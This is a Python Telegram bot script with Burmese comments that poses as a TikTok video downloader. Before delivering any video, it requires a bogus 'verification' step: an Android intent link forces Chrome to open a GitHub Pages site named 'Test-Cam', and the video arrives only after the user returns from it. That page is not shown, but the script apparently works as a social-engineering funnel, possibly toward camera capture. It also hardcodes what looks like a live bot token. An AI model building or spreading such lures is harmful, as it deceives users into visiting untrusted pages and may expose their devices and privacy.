import telebot
import requests
from telebot import types

# --- Bot Configuration ---
BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"
# မင်းရဲ့ GitHub URL ကို ဒီမှာ အမှန်ထည့်ပါ
GITHUB_URL = "https://tar-alt.github.io/Test-Cam/" 

bot = telebot.TeleBot(BOT_TOKEN)
# အရေးကြီးသည်- user_links ကို Global အနေနဲ့ အမြဲရှိနေအောင် ထားပါ
user_links = {}

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    
    # Website ကနေ ?start=Verification_Success နဲ့ ပြန်လာတာကို စစ်ဆေးခြင်း
    if "Verification_Success" in message.text:
        link = user_links.get(user_id)
        if link:
            bot.send_message(user_id, "✅ Verification အောင်မြင်ပါသည်။ ဗီဒီယို ပို့ပေးနေပါပြီ...")
            try:
                # TikTok Video ကို API ကနေ ဆွဲယူခြင်း
                api_url = f"https://www.tikwm.com/api/?url={link}&hd=1"
                res = requests.get(api_url).json()
                if res.get('code') == 0:
                    video_url = res['data'].get('hdplay') or res['data'].get('play')
                    bot.send_video(user_id, video_url, caption="✅ *Download Successful!*")
                    # ပို့ပြီးရင် link ကို ဖျက်ပစ်မယ်
                    del user_links[user_id]
                else:
                    bot.send_message(user_id, "❌ ဗီဒီယို ရှာမတွေ့ပါ။ Link ကို ပြန်စစ်ပေးပါ။")
            except Exception as e:
                bot.send_message(user_id, "⚠️ စနစ်ချို့ယွင်းချက် ဖြစ်နေပါသည်။")
        else:
            bot.send_message(user_id, "❌ Link မရှိတော့ပါ။ ကျေးဇူးပြု၍ TikTok link ပြန်ပို့ပေးပါ။")
    else:
        bot.send_message(user_id, "🌟 *Ultra HD TikTok Downloader*\n\nTikTok Link ပို့ပေးပါ။", parse_mode="Markdown")

@bot.message_handler(func=lambda message: "tiktok.com" in message.text)
def handle_link(message):
    user_id = message.chat.id
    user_links[user_id] = message.text # Link ကို မှတ်ထားလိုက်ပြီ
    
    # Chrome နဲ့ တိုက်ရိုက်ပွင့်စေမည့် Intent Link
    chrome_intent = f"intent://{GITHUB_URL.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end"
    
    markup = types.InlineKeyboardMarkup()
    verify_btn = types.InlineKeyboardButton(text="ဗီဒီယိုဒေါင်းရန် Verification လုပ်ပါ 🔓", url=chrome_intent)
    markup.add(verify_btn)
    
    bot.send_message(user_id, f"⚠️ *Verification Required*\n\nLink: `{message.text}`", reply_markup=markup, parse_mode="Markdown")

bot.infinity_polling()

